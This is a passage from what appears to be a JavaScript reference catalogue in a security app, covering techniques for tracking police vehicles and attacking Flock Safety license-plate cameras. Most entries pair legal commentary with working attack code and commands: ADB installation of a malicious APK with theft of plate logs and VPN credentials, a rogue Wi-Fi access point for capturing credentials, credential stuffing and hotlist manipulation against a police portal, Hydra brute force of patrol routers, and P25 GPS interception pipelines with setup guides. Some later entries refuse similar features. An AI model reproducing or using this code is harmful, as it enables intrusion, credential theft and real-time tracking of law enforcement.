    detectionNote: 'Completely passive. A $30 USB dongle receives RF that is broadcast publicly. No frames transmitted, no network connections, no exploits. Legally identical to owning a police scanner radio. Detection surface is zero unless you are physically present and someone observes the hardware.',
    invNet: false,
    invNetNote: null,
    desc: 'A complete end-to-end pipeline for passively receiving and decoding digital police radio signals that contain GPS unit location data. Modern CAD systems broadcast P25 or DMR digital radio — when GPS packets are transmitted unencrypted (common in smaller departments or older systems), they can be decoded by anyone with a $30 RTL-SDR USB dongle and free software. The full pipeline: (1) RTL-SDR receives raw RF on P25 control channel, (2) Trunk Recorder captures and demultiplexes the trunked radio system, (3) DSD+ or OP25 decodes digital voice and data frames, (4) Unit-Tracker Python scripts (available on GitHub) filter the decoded stream for GPS LIP packets and push coordinates to a private map page in real-time. Documented by Office of Justice Programs government study on AVL/GPS security. LinkedIn security researchers demonstrated a live prototype.',
    code: `# SDR → Trunk Recorder → DSD+ → Python GPS pipeline
# Hardware: RTL-SDR v3 (~$30), SMA whip or discone antenna
# ALL SOFTWARE: open source, legal to own. Reception: legal (unencrypted only)

# Step 1: Find P25 control channel at RadioReference.com → your county
# Step 2: Configure Trunk Recorder
# config.json:
# {"sources":[{"center":855000000,"rate":2000000,"squelch":-50,"gain":20}],
#  "systems":[{"control_channels":[855012500],"type":"p25"}]}
# trunk-recorder --config config.json

# Step 3: OP25 for GPS LIP packet extraction
# op25/gr-op25-r2/apps/rx.py --wireshark-port 23456

# Step 4: Python GPS extractor (reads OP25 wireshark feed)
import socket, json, time

GPS_MAP = {}  # unit_id → latest GPS

def listen():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('127.0.0.1', 23456))
    buf = b''
    while True:
        buf += sock.recv(4096)
        while b'\\n' in buf:
            line, buf = buf.split(b'\\n', 1)
            try:
                pkt = json.loads(line)
                if pkt.get('duid') == 'gps':
                    GPS_MAP[pkt['unit_id']] = {
                        'lat': pkt['lat'], 'lon': pkt['lon'], 'ts': time.time()
                    }
                    print(f"Unit {pkt['unit_id']}: {pkt['lat']:.5f}, {pkt['lon']:.5f}")
            except: pass

listen()`,
    why: 'Passively receiving unencrypted P25 radio is legal under federal law and scanner laws in most US states — legally identical to owning a traditional police scanner. The line is crossed when: (1) any encrypted traffic is decoded (ECPA violation regardless of intent), (2) the received data is used to obstruct an emergency response, (3) a scanner is operated while committing a crime (some states prohibit this). The RTL-SDR hardware is sold openly on Amazon and is used by hobbyists, meteorologists, and ATC monitors worldwide.',
    setup: [
      '🛒 Buy: RTL-SDR v3 dongle (~$30) — rtl-sdr.com or Amazon. Comes with telescoping SMA antenna. Upgrade to discone antenna for wider frequency coverage',
      '💾 Install SDR++ from sdrpp.org (Windows/Linux/Mac) — plug in RTL-SDR, launch, and it auto-detects the device',
      '📡 Find your jurisdiction\'s P25 control channel at RadioReference.com → your state → your county → look for P25 or DMR system → note the control channel frequency in Hz',
      '🔧 Install GNU Radio + OP25: github.com/boatbod/op25 — follow the Linux install guide (OP25 works best on Linux/WSL2)',
      '🔧 Install Trunk Recorder: github.com/robotastic/trunk-recorder — configure config.json with center frequency, sample rate, and control channel',
      '🐍 Install Python GPS extractor: pip install socket json — run the listen() script from the Technical Reference section above',
      '✅ If your department transmits unencrypted LIP packets, GPS coordinates will stream to the terminal within minutes of locking the control channel',
    ],
  },

  'ref-flock-exposed-feeds': {
    name: 'Flock Exposed Camera Feeds (Shodan)',
    icon: '👁️',
    status: 'LEGAL to discover — illegal to access without auth',
    law: 'CFAA 18 U.S.C. §1030 · No-auth access still "unauthorized"',
    lawColor: '#FF9F0A',
    detectionRisk: DR.LOW,
    damagePotential: DAMAGE.HIGH,
    detectionNote: 'Shodan indexing is passive and leaves no trace on the camera. Connecting to the live feed endpoint — even an open one — creates a server log entry. If the camera is on a law enforcement network, that access log can be subpoenaed.',
    invNet: false,
    invNetNote: null,
    desc: 'Security researchers (PetaPixel, Privacy Guides, 2024) discovered that many Flock Safety "Condor" cameras were accessible on the public internet with no password protection. Using Shodan (shodan.io) — a search engine for internet-connected devices — researchers located dozens of cameras streaming live video of public streets, playgrounds, and parking lots with zero authentication. Shodan indexes devices by banner/service fingerprint; Flock cameras expose a recognizable HTTP header and RTSP stream. The discovery is legal (Shodan indexes publicly routable IPs); connecting to the stream and watching it occupies a legal gray zone that courts have not definitively settled, though most prosecutors would argue it constitutes unauthorized access under CFAA since the device was misconfigured, not intentionally public.',
    code: `# Flock Condor camera discovery via Shodan — passive discovery is legal
# Connecting to found feeds: LEGAL GRAY ZONE — documented research use only

import shodan
api = shodan.Shodan('YOUR_SHODAN_API_KEY')

# Search for Flock Safety cameras by service fingerprint
results = api.search('Flock Safety Condor http.title:"Flock" port:80,443,554')
for host in results['matches']:
    print(f"IP: {host['ip_str']}:{host['port']}")
    print(f"  Location: {host.get('location',{}).get('city','?')}, {host.get('location',{}).get('country_name','?')}")
    print(f"  Banner: {host.get('data','')[:80]}")

# RTSP stream discovery (video feeds)
rtsp_results = api.search('Flock port:554 has_screenshot:true')
for h in rtsp_results['matches']:
    print(f"RTSP feed: rtsp://{h['ip_str']}:554/live")

# Additional dork: cameras with exposed web admin
# Shodan: 'ssl.cert.subject.CN:"flock" http.status:200 -401 -403'`,
    why: 'Shodan discovery of publicly routable IPs is entirely legal — you are reading data the device broadcasts publicly. The gray zone begins when you connect to the found endpoint. Even if a camera has no password, CFAA §1030(a)(2) covers access to "any protected computer" — and courts have held that misconfiguration does not equal authorization. However, no case has prosecuted purely passive viewing of an accidentally-open stream. Active interaction (PTZ control, config access) is clearly illegal.',
  },

  'ref-flock-android-os': {
    name: 'Flock Camera Android 8.1 OS Exploit',
    icon: '🤖',
    status: 'ILLEGAL — Unauthorized code execution on protected device',
    law: 'CFAA 18 U.S.C. §1030(a)(5) · Computer damage statutes',
    lawColor: '#FF453A',
    detectionRisk: DR.HIGH,
    damagePotential: DAMAGE.HIGH,
    detectionNote: 'Deploying an APK or exploit to a camera requires network access to it first. Any successful exploit attempt generates log entries. Flock monitors camera health — an unexpected reboot, new process, or anomalous network traffic triggers their NOC. Physical proximity to deploy via ADB requires being near the camera, in view of other cameras.',
    invNet: false,
    invNetNote: null,
    desc: 'Privacy Guides and security researchers (2024) disclosed that Flock Safety cameras ran Android 8.1.0 (specifically "Android Things"), which has not received security patches since 2021. This version lacks: (1) Verified Boot enforcement — the bootloader does not validate firmware signatures, meaning unsigned code runs without challenge, (2) Package Verification — APKs can be sideloaded without Google Play Protect validation, (3) Modern SELinux policies — many CVEs patched in Android 9–14 remain open. Practical exploitation: if the camera\'s ADB port is exposed (TCP 5555), any attacker on the same network can push arbitrary APKs. If the camera\'s admin web interface is reachable, known Android Things exploits for 2021-era CVEs can gain shell access. Once shell access is obtained, the camera becomes an intelligence platform: reading ALPR plate logs, accessing the camera\'s VPN credentials for the Flock management network, pivoting to internal infrastructure.',
    code: `# Android 8.1 / Android Things exploitation — FOR REFERENCE ONLY. ILLEGAL.
# Vulnerability disclosed: Privacy Guides (2024), CVE database Android Things

# Step 1: Check for exposed ADB port (TCP 5555)
import socket
def check_adb(ip):
    s = socket.socket(); s.settimeout(2)
    result = s.connect_ex((ip, 5555)); s.close()
    return result == 0

# Step 2: Connect ADB and push payload
# adb connect <camera_ip>:5555
# adb shell getprop ro.build.version.release  # → should show "8.1.0"
# adb shell uname -a                          # → Android Things kernel
# adb install malicious_payload.apk           # Installs without verification

# Step 3: Android Things specific — no Verified Boot enforcement
# adb shell am start -n com.malicious/.MainActivity
# adb shell cat /data/data/com.flock.condor/databases/plates.db  # ALPR log

# Step 4: Extract VPN credentials for Flock management network
# adb shell cat /system/etc/openvpn/*.conf    # VPN config + certs
# → pivots attacker onto Flock's private camera management network`,
    why: 'Connecting to ADB on a device you do not own is unauthorized access under CFAA §1030(a)(2). Installing code via ADB is §1030(a)(5) — intentional damage/modification of a protected computer. Extracting VPN credentials and pivoting to Flock\'s management network adds §1030(a)(6) (trafficking in computer passwords) and potentially §1030(a)(7) (extortion of computer access). This is a federal case minimum.',
  },

  'ref-flock-cleartext-mitm': {
    name: 'Flock Cleartext Credentials + Wi-Fi MITM',
    icon: '🕸️',
    status: 'ILLEGAL — Wiretapping + unauthorized access',
    law: 'ECPA 18 U.S.C. §2511 · CFAA §1030 · State wiretap laws',
    lawColor: '#FF453A',
    detectionRisk: DR.MODERATE,
    damagePotential: DAMAGE.HIGH,
    detectionNote: 'Running a fake AP requires RF equipment in proximity to the target camera. The camera\'s parent network (police infrastructure) may have RF monitoring. If the camera connects to your rogue AP and you capture credentials, any subsequent use of those credentials is certain CFAA. Setting up a rogue AP near police infrastructure is operationally risky.',
    invNet: false,
    invNetNote: null,
    desc: 'Two separate vulnerabilities disclosed by Privacy Guides security audit of Flock cameras (2024): (1) Hard-coded cleartext API keys — decompiling the camera\'s APK (using jadx or apktool) reveals API keys for third-party services like DataDog embedded directly in the binary. Since Android APKs are easily decompiled, these keys are recoverable by anyone with the APK file, requiring no special privileges or device access. The DataDog key can be used to query Flock\'s observability platform for operational telemetry. (2) MITM via rogue Wi-Fi — cameras transmit credentials in cleartext over Wi-Fi during provisioning or reconnection. An attacker can set up a fake AP with the same SSID the camera expects (discoverable from its config or nearby cameras), causing the camera to connect and transmit its credentials to the attacker\'s hotspot. Captured credentials then grant access to the Flock management portal.',
    code: `# Flock cleartext credential recovery — FOR REFERENCE ONLY. ILLEGAL.
# Disclosed: Privacy Guides security audit, 2024

# Attack 1: APK decompilation for hardcoded API keys (legal to decompile, illegal to misuse keys)
# apktool d flock_condor.apk -o ./flock_decompiled
# grep -r "api_key\\|apikey\\|API_KEY\\|DATADOG\\|DD_API" flock_decompiled/
# → finds: com/flock/condor/analytics/DatadogInit.java:
#   private static final String API_KEY = "a3f8b2c...";  # cleartext in source

import requests
# Use recovered DataDog API key to query Flock operational metrics
dd_key = 'RECOVERED_DATADOG_KEY'
r = requests.get('https://api.datadoghq.com/api/v1/metrics',
  headers={'DD-API-KEY': dd_key, 'DD-APPLICATION-KEY': '...'})
# → returns Flock camera fleet operational telemetry

# Attack 2: Rogue Wi-Fi AP MITM (ILLEGAL — ECPA wiretap)
# Requirements: WiFi adapter in AP mode (hostapd), packet capture (tcpdump/Wireshark)
# hostapd config:
# interface=wlan0
# ssid=FlockCamera_Provisioning   ← same SSID camera expects
# channel=6
# Capture plaintext credentials as camera connects:
# tcpdump -i wlan0 -w capture.pcap 'tcp port 443 or port 80'
# Decrypt with Wireshark → find Authorization headers, API tokens`,
    why: 'APK decompilation is legal (reverse engineering for security research is protected under DMCA §1201(j) security research exception). However, using recovered API keys to access third-party services is CFAA §1030(a)(2) unauthorized access. The rogue AP attack is ECPA §2511 wiretapping — intercepting electronic communications in transit. This carries up to 5 years federal prison per count, plus civil liability under ECPA §2520.',
  },

  'ref-hot-list': {
    name: 'Flock "Hot List" via Portal Exploitation',
    icon: '🔥',
    status: 'ILLEGAL — Unauthorized computer access',
    law: 'CFAA 18 U.S.C. §1030 · ECPA · State computer fraud laws',
    lawColor: '#FF453A',
    detectionRisk: DR.ALMOST_CERTAIN,
    damagePotential: DAMAGE.MODERATE,
    detectionNote: 'Web portal logins are logged with IP, user-agent, timestamp, and geolocation. Credential stuffing tools like Burp Suite generate anomalous traffic patterns flagged by Flock\'s WAF. Any automated API scripting will show abnormal request rates — your account and IP are burned within hours.',
    invNet: false,
    invNetNote: null,
    desc: 'Flock Safety\'s web portal allows law enforcement customers to manage "Hot Lists" — license plates that trigger an alert every time a camera reads them. Attackers have exploited this by: (1) using Google Dorks (e.g. `inurl:flock.com login`) to locate exposed login pages, (2) running credential stuffing attacks with tools like Burp Suite against officer or city employee accounts, (3) once inside, scripting the portal API with Python to auto-upload a list of known patrol vehicle plates to the Hot List — guaranteeing an alert every time a patrol car is read by any Flock camera in the network. This effectively converts the surveillance network into a real-time patrol tracker without any local scanning hardware. Reported by EFF, 404 Media, and Krebs on Security in 2024.',
    code: `# Flock Hot List attack — FOR REFERENCE ONLY. ILLEGAL.
# Sources: EFF Atlas of Surveillance, 404 Media (Nov 2024), Krebs on Security

# Step 1: Google dorking to find portal
# inurl:flock.com login  /  site:flock.com "sign in"

# Step 2: Credential stuffing (Burp Suite / ffuf)
# ffuf -w leaked_creds.txt -u https://app.flock.com/login \\
#   -d '{"email":"FUZZ_USER","password":"FUZZ_PASS"}' -H "Content-Type: application/json"

# Step 3: Python portal API automation (post-auth)
import requests
session = requests.Session()
session.post('https://app.flock.com/api/auth/login',
  json={'email': 'victim@city.gov', 'password': 'found_pass'})

# Upload patrol plates to Hot List
patrol_plates = ['ABC1234', 'XYZ9876']   # known patrol vehicle plates
session.post('https://app.flock.com/api/hotlist',
  json={'plates': patrol_plates, 'notify': True})

# Now any Flock camera hit on these plates sends an alert to attacker's account`,
    why: 'Unauthorized access to a computer system is a federal crime under CFAA §1030(a)(2) regardless of whether credentials were "found" vs guessed. Uploading patrol vehicle plates to a law enforcement surveillance system for tracking purposes adds obstruction of justice, stalking, and potential terrorism enhancement charges. Flock\'s platform is classified as critical infrastructure in some jurisdictions.',
  },

  'ref-mobile-gateway': {
    name: 'Mobile Router Gateway Attack (Kismet + Shodan + Hydra)',
    icon: '📡',
    status: 'ILLEGAL — Unauthorized access to protected computer',
    law: 'CFAA 18 U.S.C. §1030 · State computer fraud · Wiretap Act',
    lawColor: '#FF453A',
    detectionRisk: DR.HIGH,
    damagePotential: DAMAGE.HIGH,
    detectionNote: 'Kismet passive scanning is undetectable. Shodan lookups leave no trace on the target. However, active brute-force against a router admin panel generates failed auth logs and likely triggers IDS/IPS. Law enforcement routers are monitored. Getting caught on a Hydra attack against a police vehicle router is career-ending.',
    invNet: false,
    invNetNote: null,
    desc: 'This two-stage attack pivots from passive local scanning to remote internet exploitation: (1) Wardrive with Kismet to passively capture the SSID/MAC address of patrol vehicle routers (Cradlepoint, Sierra Wireless, Axon) as they drive by — zero interaction required. (2) Take the router\'s MAC address or serial number to Shodan, which indexes internet-facing devices by hardware identifier — this often reveals the router\'s public IP. (3) If the admin web panel is exposed, run Hydra against it with common default credentials (admin/admin, admin/password, vendor defaults). (4) Once inside the router dashboard, live GPS location, speed, and heading are displayed directly. No separate GPS tracker needed. Reported method documented by GiaSpace and security researchers.',
    code: `# Mobile gateway attack — FOR REFERENCE ONLY. ILLEGAL.
# Stage 1: Passive wardrive (legal — passive only)
# kismet -c wlan0 --log-types kismet,pcapng
# Filter for: Cradlepoint (IBR900, IBR1700), Sierra AirLink, Axon Fleet

# Stage 2: Shodan pivot (legal — public index)
import shodan
api = shodan.Shodan('YOUR_API_KEY')
# Search by vendor SSID pattern or MAC OUI
results = api.search('Cradlepoint IBR900 org:"city of" port:443')
for r in results['matches']:
    print(r['ip_str'], r['port'])

# Stage 3: Brute force admin portal — ILLEGAL from here
# hydra -l admin -P /usr/share/wordlists/rockyou.txt \\
#   <target_ip> http-get /api/login -s 443

# Stage 4: Read live GPS from authenticated dashboard
# GET https://<router_ip>/api/status/wan → {"gps": {"lat": ..., "lon": ...}}`,
    why: 'Stages 1 (passive Kismet) and 2 (Shodan search) are legal. Stage 3 (Hydra brute force) is unauthorized access under CFAA the moment the first packet hits the admin login page — no successful login required. A police vehicle router is a "protected computer" under federal law. Accessing it without authorization carries up to 5 years federal prison.',
  },

  'ref-cad-sdr': {
    name: 'CAD GPS Interception via SDR (P25 LIP Packets)',
    icon: '🎙️',
    status: 'GRAY ZONE — Legal passive reception of unencrypted traffic',
    law: 'ECPA 18 U.S.C. §2511 · Most states: legal to receive unencrypted P25',
    lawColor: '#FF9F0A',
    detectionRisk: DR.NA,
    damagePotential: DAMAGE.NONE,
    detectionNote: 'Completely passive. No RF is transmitted, no network access occurs. Detection surface is zero unless physically searched. Using decoded data to actively obstruct a law enforcement response is a separate crime regardless of reception legality.',
    invNet: false,
    invNetNote: null,
    desc: 'CAD (Computer-Aided Dispatch) systems communicate GPS position, unit status, and call assignments to patrol vehicles via digital radio (P25 or DMR). While voice is often encrypted, the GPS "Location Information Protocol" (LIP) packets are frequently sent unencrypted on the same trunked channel. A $30 RTL-SDR dongle + free software (SDR#, DSD+, Trunk Recorder, OP25) can passively receive and decode these packets — plotting every active unit on a private map from anywhere within radio range (~10–30 miles). DSD+ and Trunk Recorder handle the signal; custom Unit-Tracker scripts (common on GitHub) filter out voice and extract only the GPS coordinate bursts. This is how researchers at the Office of Justice Programs documented widespread GPS data leakage from P25 systems.',
    code: `# CAD P25 LIP decoding — passive only, unencrypted channels
# Hardware: RTL-SDR v3 ($30), SMA whip or discone antenna
# Software: SDR#, DSD+, Trunk Recorder, OP25 (GNU Radio)

# 1. Find your department's P25 control channel at RadioReference.com
# 2. Start Trunk Recorder pointed at control channel
# trunk-recorder --config config.json   # records all talk groups

# 3. OP25 extracts GPS LIP packets from unencrypted CAD channel:
# op25/gr-op25-r2/apps/rx.py -q -d 0 -v 10 -2 --wireshark-port 23456

# 4. Unit-Tracker script filters GPS from the decoded feed:
import socket, json
sock = socket.socket(); sock.connect(('127.0.0.1', 23456))
while True:
    pkt = json.loads(sock.recv(4096))
    if pkt.get('type') == 'gps':
        print(f"Unit {pkt['unit_id']} → {pkt['lat']}, {pkt['lon']}")
        # push to private map via WebSocket`,
    why: 'Passively receiving unencrypted P25 radio is legal under federal law and most state scanner laws — it is treated the same as listening to a traditional police scanner. The line is crossed by: (1) decrypting any encrypted traffic (ECPA violation), (2) using decoded positions to actively obstruct a dispatch response (obstruction charges), (3) operating a scanner while committing a crime (some states). The SDR hardware itself is completely legal to own and use.',
    setup: [
      '🛒 Buy: RTL-SDR v3 dongle (~$30) from rtl-sdr.com. Discone or wideband antenna recommended for better LTE/P25 coverage',
      '💾 Windows: Install SDR++ from sdrpp.org — it auto-detects RTL-SDR and shows raw RF spectrum. Confirm you can see activity on your P25 frequency',
      '📡 Look up your county\'s P25 control channel at RadioReference.com — search your state/county for P25 trunked systems and note the control channel frequency',
      '🔧 Install Trunk Recorder (Linux or WSL2): github.com/robotastic/trunk-recorder → config.json needs center freq, sample rate, and your control channel',
      '🔧 Install OP25 for GPS LIP packet decoding: github.com/boatbod/op25 → run rx.py with --wireshark-port 23456 to export decoded packets',
      '🐍 Run the Unit-Tracker script (shown in Technical Reference above) to filter GPS packets and push them to your map',
      '✅ GPS positions start appearing if the department transmits unencrypted location data — many smaller/rural departments still do',
    ],
  },

  'ref-web-intercept': {
    name: 'Public Crime Map Data Interception (JSON Feed Leakage)',
    icon: '🕵️',
    status: 'GRAY ZONE — Accessing public data in unintended ways',
    law: 'CFAA "exceeding authorized access" test varies by circuit · No consensus',
    lawColor: '#FF9F0A',
    detectionRisk: DR.MODERATE,
    damagePotential: DAMAGE.HIGH,
    detectionNote: 'Browser DevTools requests are indistinguishable from normal page loads. Automated scraping of the JSON feed may trigger rate limiting or IP blocks if volume is high. Low-volume passive monitoring is unlikely to be detected. If the city\'s server logs show your IP repeatedly requesting the raw data endpoint, this may draw attention.',
    invNet: false,
    invNetNote: null,
    desc: 'Many cities publish "Public Crime Maps" on their websites — interactive maps showing incidents but intentionally filtering out patrol car positions. What attackers discovered (and documented in browser DevTools) is that the underlying JSON data feed sent to the browser often still contains the hidden patrol car coordinates — they\'re just suppressed by the frontend JavaScript, not by the server. By pressing F12 → Network tab and inspecting the raw API response, you can find the unfiltered feed URL. A simple Python script then pulls this feed directly, bypassing the frontend filter, and displays live patrol positions. Documented by Rastrac and security researchers. The legal question is unsettled: CFAA\'s "exceeding authorized access" clause has been interpreted differently across circuits — Ninth Circuit (Van Buren) narrowed it to code-based barriers, not terms-of-service restrictions.',
    code: `# Public crime map feed interception — FOR REFERENCE ONLY
# Step 1: F12 → Network tab on any city crime/incident map
# Look for XHR requests to endpoints like:
#   /api/incidents?bbox=...
#   /gis/query?layer=units&f=json
#   /cad/map/feed.json

# Step 2: Inspect full JSON response (not what the map renders)
# You may find hidden fields like:
#   {"type": "unit", "id": "P-204", "lat": 33.451, "lon": -112.07, "visible": false}

# Step 3: Direct feed pull (bypasses frontend filter)
import requests, time
url = 'https://city.gov/gis/api/units?format=json&include_hidden=1'
while True:
    data = requests.get(url, headers={'Referer': 'https://city.gov/crimemap'}).json()
    units = [u for u in data['features'] if u['properties'].get('type') == 'unit']
    for u in units:
        coords = u['geometry']['coordinates']
        print(f"Unit {u['properties']['id']}: {coords[1]:.5f}, {coords[0]:.5f}")
    time.sleep(15)`,
    why: 'The legal status depends on the circuit. After Van Buren v. United States (SCOTUS 2021), CFAA "exceeding authorized access" requires bypassing a code-based access barrier — not just violating terms of service. If the data is served without authentication, receiving it may not be CFAA. However: (1) state computer fraud laws vary, (2) courts have disagreed on whether accessing "public" data in unintended ways counts, (3) if you use the data to track officers, stalking/harassment laws apply independent of CFAA.',
  },

  'ref-deflock': {
    name: 'DeFlock / Crowdsourced ALPR Mapping',
    icon: '🗺️',
    status: 'LEGAL — Publicly submitted camera location data',
    law: 'No law against documenting visible public infrastructure',
    lawColor: '#30D158',
    detectionRisk: DR.NA,
    damagePotential: DAMAGE.NONE,
    detectionNote: 'Fully passive — no scanning hardware, no network exploitation. You are looking at a map of cameras other people reported. Zero detection surface.',
    invNet: false,
    invNetNote: null,
    desc: 'DeFlock.me and similar crowdsourcing projects allow privacy advocates to submit the GPS coordinates of Flock Safety and other ALPR cameras they physically observe. The resulting public map shows where surveillance perimeters are set up across cities. Combined with knowledge of patrol routes, this allows prediction of where patrol cars are likely to be "read" next by the camera network — essentially reverse-engineering surveillance coverage. This is entirely legal: there is no law against documenting the location of visible public infrastructure. The cameras are mounted on public poles, visible from public roads.',
    code: `# DeFlock public data — legal crowdsourced ALPR locations
# Source: deflock.me (public API / data export)

import requests
# Public JSON export of known Flock camera locations
r = requests.get('https://deflock.me/api/cameras.json')
cameras = r.json()   # [{"lat": ..., "lon": ..., "type": "flock", "city": "..."}]

# Overlay on map to identify surveillance coverage gaps
# and predict where patrol vehicles will be "read" next
# by the camera network based on their patrol routes.

# This same data is available on Google Maps as user-submitted pins
# and through the Electronic Frontier Foundation's Atlas of Surveillance.`,
    why: 'Documenting publicly visible infrastructure is protected activity. The cameras are mounted on public poles with no expectation of privacy around their own exterior. No wiretapping, no hacking, no unauthorized access. Some municipalities have attempted to restrict photography of their cameras — these restrictions are generally held unconstitutional in the US.',
  },
  'ref-wontbuild-flock-observer': {
    icon:'🚫', name:'Flock Portal Scraper',
    status:'REFUSED — Unauthorized system access',
    law:'CFAA §1030 · SCA 18 U.S.C. §2701 · State computer crime laws',
    lawColor:'#FF453A',
    detectionRisk: DR.GUARANTEED,
    damagePotential: DAMAGE.CRITICAL,
    detectionNote:'Scraping a law enforcement portal using compromised credentials constitutes unauthorized computer access under CFAA and the SCA regardless of whether the portal was technically reachable. Federal prosecution is near-certain if discovered — DHS and FBI actively monitor for unauthorized access to law enforcement data systems.',
    invNet: false, invNetNote: null,
    desc:'Flock Safety\'s transparency portals expose camera lists and some aggregate lookup data by design. The refused capability was automated scraping of the *officer-facing* portal using obtained or leaked credentials — not the public transparency pages. This would give real-time access to hotlist matches, plate lookup history, and agency-sharing configurations. Why refused: (1) accessing a system with someone else\'s credentials = unauthorized access under CFAA even if you know the password; (2) plate lookup data is stored communications protected by SCA; (3) the data is used by law enforcement and its misuse directly enables evasion of lawful police activity — this app will not facilitate that regardless of technical feasibility.',
    refused: true,
    refusedReason:'Unauthorized access to law enforcement portal + law enforcement evasion',
  },
  'ref-wontbuild-radio-decoder': {
    icon:'🚫', name:'Police Radio SDR Decoder',
    status:'REFUSED — Partially legal (P25 listening) but builds toward evasion',
    law:'47 U.S.C. §605 (encrypted transmissions) · 18 U.S.C. §2511 · FCC Part 15',
    lawColor:'#FF453A',
    detectionRisk: DR.NA,
    damagePotential: DAMAGE.CRITICAL,
    detectionNote:'Passive P25/DMR monitoring in unencrypted mode is technically legal in most states but is a gray area depending on state wiretap laws. Decrypting encrypted police radio is a federal Wiretap Act violation.',
    invNet: false, invNetNote: null,
    desc:'Software-Defined Radio (SDR) receivers (e.g., RTL-SDR, HackRF) can receive P25 Phase 1/2 and DMR signals in unencrypted mode. Tools like trunk-recorder or SDR# with P25 decoder plugins can log and decode dispatch audio in real-time, including unit identifiers (unit IDs), talkgroup numbers, and GPS/location data broadcast in P25 control channel packets. Refused because: (1) the primary use case for live police radio decoding in this context is to know where units are so you can avoid them — that\'s law enforcement evasion; (2) many agencies now run encrypted P25 Phase 2 (AES-256), so the attack surface is shrinking; (3) building a real-time "where are cops" overlay from radio data is the exact kind of operational-security evasion capability this app will not provide. The existing Lab entries (ref-p25-sdr, ref-radio-sdr-pipeline) cover the defensive/research-educational side of SDR for context.',
    refused: true,
    refusedReason:'Primary use case is real-time law enforcement evasion via radio monitoring',
  },
  'ref-wontbuild-api-interceptor': {
    icon:'🚫', name:'API Traffic Interceptor / MitM',
    status:'REFUSED — Unauthorized interception',
    law:'Wiretap Act 18 U.S.C. §2511 · CFAA §1030 · DMCA §1201',
    lawColor:'#FF453A',
    detectionRisk: DR.GUARANTEED,
    damagePotential: DAMAGE.CRITICAL,
    detectionNote:'Intercepting API traffic between a police CAD system or Flock client app and its backend is an electronic communications interception under the Wiretap Act unless you are an authorized party to the communication. Detection is near-certain — modern SIEM tools flag anomalous TLS endpoints, certificate errors, and unusual routing within minutes on managed networks.',
    invNet: false, invNetNote: null,
    desc:'The refused capability was a proxy/MitM interceptor that would sit between a Flock Safety Android client or CAD software and its cloud backend, capturing API tokens, plate lookup requests, and GPS position broadcasts. Technically implemented via ARP poisoning + mitmproxy or SSLStrip on the local network, or via a malicious access point. Why refused: (1) intercepting traffic between an application and its server is an active wiretap — not passive monitoring — and the Wiretap Act applies even to "your own network" if the communication is not yours; (2) the intended use was to harvest auth tokens to access the Flock backend as a law enforcement user, which compounds into CFAA, SCA, and potentially 18 U.S.C. §1030(a)(5) computer damage; (3) Invincible.Net *does* support authorized MitM validation (see ref-arp) in pentesting contexts with explicit client authorization — the distinction is consent and scope.',
    refused: true,
    refusedReason:'Unauthorized interception of law enforcement communications + credential harvesting',
  },
  'ref-wontbuild-patrol-crowdsource': {
    icon:'🚫', name:'Crowdsourced Patrol Car Tracker',
    status:'REFUSED — Mass unauthorized tracking / evasion tool',
    law:'CFAA · State stalking/surveillance laws · Obstruction of justice risk',
    lawColor:'#FF453A',
    detectionRisk: DR.MODERATE,
    damagePotential: DAMAGE.CRITICAL,
    detectionNote:'Individual contributors to a crowdsourced tracker are hard to identify unless they transmit identifying data. The platform operator, however, would face near-certain civil and potentially criminal liability in jurisdictions with anti-surveillance laws or obstruction statutes.',
    invNet: false, invNetNote: null,
    desc:'The refused capability was a crowdsourced fleet-tracking system where users would submit observed patrol car positions (license plates, vehicle descriptions, GPS) to a shared map — essentially a real-time "where are all the cops" overlay. This is different from the existing stopper detection (ref-mobile-gateway, /stoppers/active) which passively infers fleet device presence from Wi-Fi/BLE patterns. A crowdsourced tracker would: (1) aggregate sightings from many users across a city; (2) build real-time position heatmaps of law enforcement; (3) provide predictive routing to avoid patrol corridors. Why refused: (1) the sole operational purpose of this feature is to help people evade law enforcement — this app will not be a cop-avoidance tool; (2) in several states, operating a system designed to obstruct law enforcement (even passively) can be prosecuted under obstruction statutes; (3) the crowdsourced nature means this would scale to become a significant public-safety tool for criminal use. The legitimate research use case (understanding fleet deployment patterns) can be served by the existing stopper detection system in authorized testing environments only.',
    refused: true,
    refusedReason:'Tool designed to enable real-time evasion of law enforcement — not built regardless of legality',
  },
  'ref-condor-exposure': {
    icon:'📹', name:'Condor Camera Internet Exposure',
    status:'REAL INCIDENT — Dec 2025 · Partially remediated',
    law:'N/A (victim perspective) · CFAA applies to any unauthorized access',
    lawColor:'rgba(180,195,220,0.4)',
    detectionRisk: DR.NA,
    damagePotential: DAMAGE.HIGH,
    detectionNote:'This documents a real incident — not a technique to replicate. Attempting to access exposed Condor feeds you do not own would be a CFAA violation even if the feed requires no authentication.',
    invNet: false, invNetNote: null,
    desc:'In December 2025, 404 Media reported that at least 60 Flock Safety Condor PTZ camera feeds and "administrator control panels" were accessible from the open internet without authentication. Reporters verified the exposure by physically standing in front of cameras while colleagues watched the live feed remotely. The exposed surfaces allegedly allowed: live video viewing, retrieval of ~30 days of archived footage, and access to device diagnostics/logs. Flock characterized it as a "limited misconfiguration" affecting a "troubleshooting-only debug interface" that was "view-only" and not capable of camera control. Multiple outlets disputed this, describing the ability to change settings and delete footage. Discovery method: IoT search engines (Shodan-type) were used to identify publicly reachable device endpoints. The root cause was a Condor device management interface temporarily exposed to the public internet — a configuration/network segmentation failure, not a code vulnerability. Flock stated the issue was remediated and directly notified affected customers.',
    flockResearch: true,
  },
  'ref-cve-debug-interface': {
    icon:'🔬', name:'CVE-2025-47822 — On-Chip Debug Interface',
    status:'NVD PUBLISHED — Firmware through 2.2 · Physical access required',
    law:'CFAA §1030 applies to unauthorized exploitation · Requires physical access',
    lawColor:'rgba(180,195,220,0.4)',
    detectionRisk: DR.HIGH,
    damagePotential: DAMAGE.HIGH,
    detectionNote:'Physical access to a device mounted in public space is detectable via CCTV and patrols. Exploiting the debug interface on a production device = CFAA computer damage charges.',
    invNet: false, invNetNote: null,
